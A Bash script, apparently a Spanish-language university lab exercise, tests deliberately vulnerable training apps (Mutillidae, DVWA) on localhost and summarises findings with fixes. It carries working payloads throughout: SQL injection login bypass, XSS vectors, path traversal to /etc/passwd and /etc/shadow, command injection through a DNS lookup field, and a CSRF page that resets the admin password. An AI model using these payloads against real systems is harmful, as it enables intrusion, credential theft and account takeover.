#!/bin/bash
################################################################################
# PAI-3 VULNAWEB - Pruebas Manuales de Vulnerabilidades
# Script complementario para validación manual de vulnerabilidades
################################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

RESULTS_DIR="./resultados-manuales-$(date +%Y%m%d-%H%M%S)"

log_info() { echo -e "${GREEN}[✓]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[⚠]${NC} $1"; }
log_error() { echo -e "${RED}[✗]${NC} $1"; }

create_results_dir() {
    mkdir -p "$RESULTS_DIR"
    mkdir -p "$RESULTS_DIR/evidencias"
    mkdir -p "$RESULTS_DIR/screenshots"
    mkdir -p "$RESULTS_DIR/logs"
}

test_sql_injection_detailed() {
    echo -e "\n${CYAN}${BOLD}=== PRUEBAS DETALLADAS DE SQL INJECTION ===${NC}"
    
    log_info "Probando SQL Injection en Mutillidae..."
    
    # Test 1: Authentication Bypass
    echo "Test 1: Authentication Bypass" > "$RESULTS_DIR/sql-authentication-bypass.txt"
    curl -s -o "$RESULTS_DIR/evidencias/sql-auth-bypass.html" \
        "http://localhost:8082/index.php?page=login.php" \
        --data "username=admin%27+OR+%271%27%3D%271--+&password=anything&login-php-submit-button=Login"
    
    if grep -q "Logged In Admin" "$RESULTS_DIR/evidencias/sql-auth-bypass.html"; then
        echo "[VULNERABLE] SQL Injection Authentication Bypass exitoso" >> "$RESULTS_DIR/sql-authentication-bypass.txt"
        log_info "✓ SQL Authentication Bypass: VULNERABLE"
    else
        echo "[SAFE] SQL Injection Authentication Bypass falló" >> "$RESULTS_DIR/sql-authentication-bypass.txt"
        log_warning "⚠ SQL Authentication Bypass: NO VULNERABLE"
    fi
    
    # Test 2: Union-based SQL Injection
    echo -e "\nTest 2: Union-based SQL Injection" >> "$RESULTS_DIR/sql-authentication-bypass.txt"
    curl -s -o "$RESULTS_DIR/evidencias/sql-union.html" \
        "http://localhost:8082/index.php?page=user-info.php&username=admin%27+UNION+SELECT+1,user(),version(),4,5,6,7--+&password=&user-info-php-submit-button=View+Account+Details"
    
    if grep -q "mysql\|version\|user" "$RESULTS_DIR/evidencias/sql-union.html"; then
        echo "[VULNERABLE] Union-based SQL Injection exitoso" >> "$RESULTS_DIR/sql-authentication-bypass.txt"
        log_info "✓ Union-based SQL Injection: VULNERABLE"
    else
        echo "[SAFE] Union-based SQL Injection falló" >> "$RESULTS_DIR/sql-authentication-bypass.txt"
        log_warning "⚠ Union-based SQL Injection: NO VULNERABLE"
    fi
    
    # Test 3: Error-based SQL Injection
    echo -e "\nTest 3: Error-based SQL Injection" >> "$RESULTS_DIR/sql-authentication-bypass.txt"
    curl -s -o "$RESULTS_DIR/evidencias/sql-error.html" \
        "http://localhost:8082/index.php?page=user-info.php&username=admin%27&password=&user-info-php-submit-button=View+Account+Details"
    
    if grep -q "error\|mysql\|syntax" "$RESULTS_DIR/evidencias/sql-error.html"; then
        echo "[VULNERABLE] Error-based SQL Injection - información de BD expuesta" >> "$RESULTS_DIR/sql-authentication-bypass.txt"
        log_info "✓ Error-based SQL Injection: VULNERABLE"
    else
        echo "[SAFE] Error-based SQL Injection - sin errores expuestos" >> "$RESULTS_DIR/sql-authentication-bypass.txt"
        log_warning "⚠ Error-based SQL Injection: NO VULNERABLE"
    fi
}

test_xss_detailed() {
    echo -e "\n${CYAN}${BOLD}=== PRUEBAS DETALLADAS DE XSS ===${NC}"
    
    log_info "Probando XSS en múltiples aplicaciones..."
    
    # Test 1: XSS Reflejado en Mutillidae
    echo "Test 1: XSS Reflejado en Mutillidae" > "$RESULTS_DIR/xss-reflected.txt"
    curl -s -o "$RESULTS_DIR/evidencias/xss-mutillidae-reflected.html" \
        "http://localhost:8082/index.php?page=dns-lookup.php&target_host=%3Cscript%3Ealert%28%27XSS_MUTILLIDAE%27%29%3C%2Fscript%3E&dns-lookup-php-submit-button=Lookup+DNS"
    
    if grep -q "<script>alert('XSS_MUTILLIDAE')</script>" "$RESULTS_DIR/evidencias/xss-mutillidae-reflected.html"; then
        echo "[VULNERABLE] XSS Reflejado en Mutillidae - script ejecutándose" >> "$RESULTS_DIR/xss-reflected.txt"
        log_info "✓ XSS Reflejado Mutillidae: VULNERABLE"
    else
        echo "[SAFE] XSS Reflejado en Mutillidae - script filtrado" >> "$RESULTS_DIR/xss-reflected.txt"
        log_warning "⚠ XSS Reflejado Mutillidae: NO VULNERABLE"
    fi
    
    # Test 2: XSS Reflejado en DVWA
    echo -e "\nTest 2: XSS Reflejado en DVWA" >> "$RESULTS_DIR/xss-reflected.txt"
    curl -s -o "$RESULTS_DIR/evidencias/xss-dvwa-reflected.html" \
        "http://localhost:8083/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS_DVWA%27%29%3C%2Fscript%3E"
    
    if grep -q "<script>alert('XSS_DVWA')</script>" "$RESULTS_DIR/evidencias/xss-dvwa-reflected.html"; then
        echo "[VULNERABLE] XSS Reflejado en DVWA - script ejecutándose" >> "$RESULTS_DIR/xss-reflected.txt"
        log_info "✓ XSS Reflejado DVWA: VULNERABLE"
    else
        echo "[SAFE] XSS Reflejado en DVWA - script filtrado" >> "$RESULTS_DIR/xss-reflected.txt"
        log_warning "⚠ XSS Reflejado DVWA: NO VULNERABLE"
    fi
    
    # Test 3: XSS con diferentes vectores
    echo -e "\nTest 3: XSS con vectores alternativos" >> "$RESULTS_DIR/xss-reflected.txt"
    
    # Vector con img
    curl -s -o "$RESULTS_DIR/evidencias/xss-img-vector.html" \
        "http://localhost:8082/index.php?page=dns-lookup.php&target_host=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS_IMG%27%29%3E&dns-lookup-php-submit-button=Lookup+DNS"
    
    if grep -q "onerror=alert('XSS_IMG')" "$RESULTS_DIR/evidencias/xss-img-vector.html"; then
        echo "[VULNERABLE] XSS con vector IMG - onerror ejecutándose" >> "$RESULTS_DIR/xss-reflected.txt"
        log_info "✓ XSS Vector IMG: VULNERABLE"
    else
        echo "[SAFE] XSS con vector IMG - filtrado" >> "$RESULTS_DIR/xss-reflected.txt"
    fi
    
    # Vector con svg
    curl -s -o "$RESULTS_DIR/evidencias/xss-svg-vector.html" \
        "http://localhost:8082/index.php?page=dns-lookup.php&target_host=%3Csvg+onload%3Dalert%28%27XSS_SVG%27%29%3E&dns-lookup-php-submit-button=Lookup+DNS"
    
    if grep -q "onload=alert('XSS_SVG')" "$RESULTS_DIR/evidencias/xss-svg-vector.html"; then
        echo "[VULNERABLE] XSS con vector SVG - onload ejecutándose" >> "$RESULTS_DIR/xss-reflected.txt"
        log_info "✓ XSS Vector SVG: VULNERABLE"
    else
        echo "[SAFE] XSS con vector SVG - filtrado" >> "$RESULTS_DIR/xss-reflected.txt"
    fi
}

test_path_traversal_detailed() {
    echo -e "\n${CYAN}${BOLD}=== PRUEBAS DETALLADAS DE PATH TRAVERSAL ===${NC}"
    
    log_info "Probando Path Traversal para acceder a archivos del sistema..."
    
    # Test 1: Acceso a /etc/passwd en Mutillidae
    echo "Test 1: Path Traversal /etc/passwd en Mutillidae" > "$RESULTS_DIR/path-traversal.txt"
    curl -s -o "$RESULTS_DIR/evidencias/path-passwd-mutillidae.html" \
        "http://localhost:8082/index.php?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    
    if grep -q "root:" "$RESULTS_DIR/evidencias/path-passwd-mutillidae.html"; then
        echo "[CRITICAL] Path Traversal - /etc/passwd accesible" >> "$RESULTS_DIR/path-traversal.txt"
        echo "Usuarios encontrados:" >> "$RESULTS_DIR/path-traversal.txt"
        grep ":" "$RESULTS_DIR/evidencias/path-passwd-mutillidae.html" | head -5 >> "$RESULTS_DIR/path-traversal.txt"
        log_error "🚨 Path Traversal /etc/passwd: CRÍTICO"
    else
        echo "[SAFE] Path Traversal - /etc/passwd no accesible" >> "$RESULTS_DIR/path-traversal.txt"
        log_info "✓ Path Traversal /etc/passwd: PROTEGIDO"
    fi
    
    # Test 2: Acceso a /etc/shadow
    echo -e "\nTest 2: Path Traversal /etc/shadow" >> "$RESULTS_DIR/path-traversal.txt"
    curl -s -o "$RESULTS_DIR/evidencias/path-shadow.html" \
        "http://localhost:8082/index.php?page=..%2F..%2F..%2F..%2Fetc%2Fshadow"
    
    if grep -q "root:\$" "$RESULTS_DIR/evidencias/path-shadow.html"; then
        echo "[CRITICAL] Path Traversal - /etc/shadow accesible (hashes de contraseñas)" >> "$RESULTS_DIR/path-traversal.txt"
        log_error "🚨 Path Traversal /etc/shadow: CRÍTICO"
    else
        echo "[SAFE] Path Traversal - /etc/shadow no accesible" >> "$RESULTS_DIR/path-traversal.txt"
        log_info "✓ Path Traversal /etc/shadow: PROTEGIDO"
    fi
    
    # Test 3: Acceso a archivos de configuración
    echo -e "\nTest 3: Path Traversal archivos de configuración" >> "$RESULTS_DIR/path-traversal.txt"
    
    # Apache configuration
    curl -s -o "$RESULTS_DIR/evidencias/path-apache-conf.html" \
        "http://localhost:8082/index.php?page=..%2F..%2F..%2F..%2Fetc%2Fapache2%2Fapache2.conf"
    
    if grep -q "ServerRoot\|DocumentRoot" "$RESULTS_DIR/evidencias/path-apache-conf.html"; then
        echo "[HIGH] Path Traversal - configuración Apache accesible" >> "$RESULTS_DIR/path-traversal.txt"
        log_warning "⚠ Path Traversal Apache config: VULNERABLE"
    fi
    
    # PHP configuration
    curl -s -o "$RESULTS_DIR/evidencias/path-php-conf.html" \
        "http://localhost:8082/index.php?page=..%2F..%2F..%2F..%2Fetc%2Fphp%2F7.4%2Fapache2%2Fphp.ini"
    
    if grep -q "php.ini\|extension" "$RESULTS_DIR/evidencias/path-php-conf.html"; then
        echo "[MEDIUM] Path Traversal - configuración PHP accesible" >> "$RESULTS_DIR/path-traversal.txt"
        log_warning "⚠ Path Traversal PHP config: VULNERABLE"
    fi
}

test_command_injection() {
    echo -e "\n${CYAN}${BOLD}=== PRUEBAS DE COMMAND INJECTION ===${NC}"
    
    log_info "Probando Command Injection..."
    
    echo "Test 1: Command Injection en DNS Lookup" > "$RESULTS_DIR/command-injection.txt"
    
    # Test básico con ; ls
    curl -s -o "$RESULTS_DIR/evidencias/cmd-injection-ls.html" \
        "http://localhost:8082/index.php?page=dns-lookup.php&target_host=google.com%3B+ls+-la&dns-lookup-php-submit-button=Lookup+DNS"
    
    if grep -q "total\|drwx\|index.php" "$RESULTS_DIR/evidencias/cmd-injection-ls.html"; then
        echo "[CRITICAL] Command Injection - comando 'ls' ejecutado" >> "$RESULTS_DIR/command-injection.txt"
        log_error "🚨 Command Injection (ls): CRÍTICO"
    else
        echo "[SAFE] Command Injection - comando 'ls' bloqueado" >> "$RESULTS_DIR/command-injection.txt"
        log_info "✓ Command Injection (ls): PROTEGIDO"
    fi
    
    # Test con whoami
    curl -s -o "$RESULTS_DIR/evidencias/cmd-injection-whoami.html" \
        "http://localhost:8082/index.php?page=dns-lookup.php&target_host=google.com%3B+whoami&dns-lookup-php-submit-button=Lookup+DNS"
    
    if grep -q "www-data\|root\|apache" "$RESULTS_DIR/evidencias/cmd-injection-whoami.html"; then
        echo "[CRITICAL] Command Injection - comando 'whoami' ejecutado" >> "$RESULTS_DIR/command-injection.txt"
        log_error "🚨 Command Injection (whoami): CRÍTICO"
    else
        echo "[SAFE] Command Injection - comando 'whoami' bloqueado" >> "$RESULTS_DIR/command-injection.txt"
    fi
    
    # Test con cat /etc/passwd
    curl -s -o "$RESULTS_DIR/evidencias/cmd-injection-passwd.html" \
        "http://localhost:8082/index.php?page=dns-lookup.php&target_host=google.com%3B+cat+%2Fetc%2Fpasswd&dns-lookup-php-submit-button=Lookup+DNS"
    
    if grep -q "root:" "$RESULTS_DIR/evidencias/cmd-injection-passwd.html"; then
        echo "[CRITICAL] Command Injection - acceso a /etc/passwd vía command injection" >> "$RESULTS_DIR/command-injection.txt"
        log_error "🚨 Command Injection (cat /etc/passwd): CRÍTICO"
    else
        echo "[SAFE] Command Injection - acceso a /etc/passwd bloqueado" >> "$RESULTS_DIR/command-injection.txt"
    fi
}

test_csrf() {
    echo -e "\n${CYAN}${BOLD}=== PRUEBAS DE CSRF ===${NC}"
    
    log_info "Probando Cross-Site Request Forgery..."
    
    echo "Test 1: CSRF en cambio de contraseña" > "$RESULTS_DIR/csrf.txt"
    
    # Generar formulario CSRF malicioso
    cat > "$RESULTS_DIR/evidencias/csrf-poc.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Proof of Concept</title>
</head>
<body>
    <h1>CSRF Test - Cambio de Contraseña</h1>
    <form id="csrf-form" action="http://localhost:8082/index.php?page=change-password.php" method="POST">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="password" value="hacked123">
        <input type="hidden" name="confirm_password" value="hacked123">
        <input type="hidden" name="change-password-php-submit-button" value="Change Password">
    </form>
    
    <script>
        // Auto-submit the form (simulating a CSRF attack)
        // document.getElementById('csrf-form').submit();
    </script>
    
    <p>Este formulario simula un ataque CSRF que intentaría cambiar la contraseña de admin a 'hacked123'</p>
    <button onclick="document.getElementById('csrf-form').submit();">Ejecutar CSRF</button>
</body>
</html>
EOF
    
    echo "[POC] Formulario CSRF generado en evidencias/csrf-poc.html" >> "$RESULTS_DIR/csrf.txt"
    log_info "✓ CSRF PoC generado"
    
    # Test de ausencia de tokens CSRF
    curl -s -o "$RESULTS_DIR/evidencias/change-password-form.html" \
        "http://localhost:8082/index.php?page=change-password.php"
    
    if ! grep -q "csrf_token\|_token" "$RESULTS_DIR/evidencias/change-password-form.html"; then
        echo "[VULNERABLE] Formulario de cambio de contraseña sin token CSRF" >> "$RESULTS_DIR/csrf.txt"
        log_warning "⚠ CSRF Protection: NO IMPLEMENTADO"
    else
        echo "[SAFE] Formulario con token CSRF encontrado" >> "$RESULTS_DIR/csrf.txt"
        log_info "✓ CSRF Protection: IMPLEMENTADO"
    fi
}

test_information_disclosure() {
    echo -e "\n${CYAN}${BOLD}=== PRUEBAS DE INFORMATION DISCLOSURE ===${NC}"
    
    log_info "Probando exposición de información sensible..."
    
    echo "Test 1: Información en headers HTTP" > "$RESULTS_DIR/information-disclosure.txt"
    
    # Verificar headers que exponen información
    curl -s -I "http://localhost:8082/" > "$RESULTS_DIR/evidencias/http-headers.txt"
    
    if grep -q "X-Powered-By.*PHP" "$RESULTS_DIR/evidencias/http-headers.txt"; then
        echo "[MEDIUM] Header X-Powered-By expone versión de PHP" >> "$RESULTS_DIR/information-disclosure.txt"
        log_warning "⚠ PHP Version Disclosure: VULNERABLE"
    fi
    
    if grep -q "Server.*Apache" "$RESULTS_DIR/evidencias/http-headers.txt"; then
        echo "[LOW] Header Server expone información del servidor" >> "$RESULTS_DIR/information-disclosure.txt"
        log_warning "⚠ Server Version Disclosure: INFORMATION LEAKED"
    fi
    
    # Test phpinfo()
    curl -s -o "$RESULTS_DIR/evidencias/phpinfo.html" \
        "http://localhost:8082/phpinfo.php"
    
    if grep -q "phpinfo()" "$RESULTS_DIR/evidencias/phpinfo.html"; then
        echo "[HIGH] phpinfo() accesible - información completa del sistema expuesta" >> "$RESULTS_DIR/information-disclosure.txt"
        log_error "🚨 phpinfo() Disclosure: CRÍTICO"
    else
        echo "[SAFE] phpinfo() no accesible" >> "$RESULTS_DIR/information-disclosure.txt"
    fi
    
    # Test de directorios y archivos sensibles
    for file in "robots.txt" ".htaccess" "config.php" "database.php" "admin.php"; do
        curl -s -o "/tmp/test_$file" "http://localhost:8082/$file"
        if [ -s "/tmp/test_$file" ] && ! grep -q "Not Found\|404" "/tmp/test_$file"; then
            echo "[INFO] Archivo sensible encontrado: $file" >> "$RESULTS_DIR/information-disclosure.txt"
            cp "/tmp/test_$file" "$RESULTS_DIR/evidencias/found_$file"
        fi
        rm -f "/tmp/test_$file"
    done
}

generate_vulnerability_summary() {
    echo -e "\n${CYAN}${BOLD}=== GENERANDO RESUMEN DE VULNERABILIDADES ===${NC}"
    
    SUMMARY_FILE="$RESULTS_DIR/RESUMEN_VULNERABILIDADES.txt"
    
    cat > "$SUMMARY_FILE" << EOF
PAI-3 VULNAWEB - RESUMEN DE VULNERABILIDADES DETECTADAS
========================================================

Fecha: $(date '+%d/%m/%Y %H:%M:%S')
Security Team: INSEGUS
Aplicación auditada: OWASP Mutillidae II + DVWA
Método: Pruebas manuales automatizadas

VULNERABILIDADES CRÍTICAS:
EOF
    
    # Contar vulnerabilidades críticas
    CRITICAL_COUNT=0
    if grep -q "\[CRITICAL\]" "$RESULTS_DIR"/*.txt 2>/dev/null; then
        echo "- $(grep -h "\[CRITICAL\]" "$RESULTS_DIR"/*.txt | wc -l) vulnerabilidades críticas detectadas" >> "$SUMMARY_FILE"
        grep -h "\[CRITICAL\]" "$RESULTS_DIR"/*.txt | sed 's/\[CRITICAL\]/  • [CRÍTICO]/' >> "$SUMMARY_FILE"
        CRITICAL_COUNT=$(grep -h "\[CRITICAL\]" "$RESULTS_DIR"/*.txt | wc -l)
    else
        echo "- No se detectaron vulnerabilidades críticas" >> "$SUMMARY_FILE"
    fi
    
    echo "" >> "$SUMMARY_FILE"
    echo "VULNERABILIDADES ALTAS:" >> "$SUMMARY_FILE"
    HIGH_COUNT=0
    if grep -q "\[HIGH\]" "$RESULTS_DIR"/*.txt 2>/dev/null; then
        echo "- $(grep -h "\[HIGH\]" "$RESULTS_DIR"/*.txt | wc -l) vulnerabilidades altas detectadas" >> "$SUMMARY_FILE"
        grep -h "\[HIGH\]" "$RESULTS_DIR"/*.txt | sed 's/\[HIGH\]/  • [ALTO]/' >> "$SUMMARY_FILE"
        HIGH_COUNT=$(grep -h "\[HIGH\]" "$RESULTS_DIR"/*.txt | wc -l)
    else
        echo "- No se detectaron vulnerabilidades altas" >> "$SUMMARY_FILE"
    fi
    
    echo "" >> "$SUMMARY_FILE"
    echo "VULNERABILIDADES VULNERABLES:" >> "$SUMMARY_FILE"
    VULN_COUNT=0
    if grep -q "\[VULNERABLE\]" "$RESULTS_DIR"/*.txt 2>/dev/null; then
        echo "- $(grep -h "\[VULNERABLE\]" "$RESULTS_DIR"/*.txt | wc -l) vulnerabilidades confirmadas" >> "$SUMMARY_FILE"
        grep -h "\[VULNERABLE\]" "$RESULTS_DIR"/*.txt | sed 's/\[VULNERABLE\]/  • [VULNERABLE]/' >> "$SUMMARY_FILE"
        VULN_COUNT=$(grep -h "\[VULNERABLE\]" "$RESULTS_DIR"/*.txt | wc -l)
    else
        echo "- No se confirmaron vulnerabilidades adicionales" >> "$SUMMARY_FILE"
    fi
    
    echo "" >> "$SUMMARY_FILE"
    echo "TOTAL DE VULNERABILIDADES: $((CRITICAL_COUNT + HIGH_COUNT + VULN_COUNT))" >> "$SUMMARY_FILE"
    
    echo "" >> "$SUMMARY_FILE"
    echo "ARCHIVOS DE EVIDENCIA GENERADOS:" >> "$SUMMARY_FILE"
    find "$RESULTS_DIR/evidencias" -name "*.html" | wc -l | sed 's/^/- /' >> "$SUMMARY_FILE"
    echo "archivos HTML con evidencias" >> "$SUMMARY_FILE"
    
    echo "" >> "$SUMMARY_FILE"
    echo "RECOMENDACIONES INMEDIATAS:" >> "$SUMMARY_FILE"
    echo "1. Implementar validación y sanitización de inputs" >> "$SUMMARY_FILE"
    echo "2. Usar prepared statements para prevenir SQL Injection" >> "$SUMMARY_FILE"
    echo "3. Implementar Content Security Policy (CSP) para XSS" >> "$SUMMARY_FILE"
    echo "4. Validar y restringir accesos a archivos del sistema" >> "$SUMMARY_FILE"
    echo "5. Implementar tokens CSRF en formularios" >> "$SUMMARY_FILE"
    echo "6. Ocultar información del servidor en headers HTTP" >> "$SUMMARY_FILE"
    
    log_info "✓ Resumen generado en: $SUMMARY_FILE"
}

show_results() {
    echo -e "\n${GREEN}${BOLD}🎯 PRUEBAS MANUALES COMPLETADAS${NC}\n"
    
    echo -e "${CYAN}📊 Resultados:${NC}"
    echo -e "  📁 Directorio: ${BOLD}$RESULTS_DIR${NC}"
    echo -e "  📝 Archivos de log: ${BOLD}$(find "$RESULTS_DIR" -name "*.txt" | wc -l)${NC}"
    echo -e "  🔍 Evidencias HTML: ${BOLD}$(find "$RESULTS_DIR/evidencias" -name "*.html" | wc -l)${NC}"
    
    # Mostrar resumen rápido
    if [ -f "$RESULTS_DIR/RESUMEN_VULNERABILIDADES.txt" ]; then
        echo -e "\n${YELLOW}📋 Resumen Rápido:${NC}"
        tail -5 "$RESULTS_DIR/RESUMEN_VULNERABILIDADES.txt" | grep -E "(CRITICAL|HIGH|VULNERABLE|TOTAL)" | head -3
    fi
    
    echo -e "\n${BLUE}📁 Para ver resultados detallados:${NC}"
    echo -e "  cat $RESULTS_DIR/RESUMEN_VULNERABILIDADES.txt"
    echo -e "  ls -la $RESULTS_DIR/"
    
    echo -e "\n${GREEN}✅ Objetivo 2 PAI-3: Evidencias de vulnerabilidades generadas${NC}"
}

# Función principal
main() {
    echo -e "${CYAN}${BOLD}"
    cat << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║         PAI-3 VULNAWEB - PRUEBAS MANUALES                   ║
║           Validación detallada de vulnerabilidades          ║
╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}\n"
    
    # Verificar que los servicios estén disponibles
    if ! curl -s "http://localhost:8082" > /dev/null; then
        log_error "Mutillidae no está disponible en http://localhost:8082"
        log_error "Ejecuta primero: ./setup-objetivo2.sh"
        exit 1
    fi
    
    create_results_dir
    test_sql_injection_detailed
    test_xss_detailed
    test_path_traversal_detailed
    test_command_injection
    test_csrf
    test_information_disclosure
    generate_vulnerability_summary
    show_results
}

# Ejecutar función principal
main "$@"
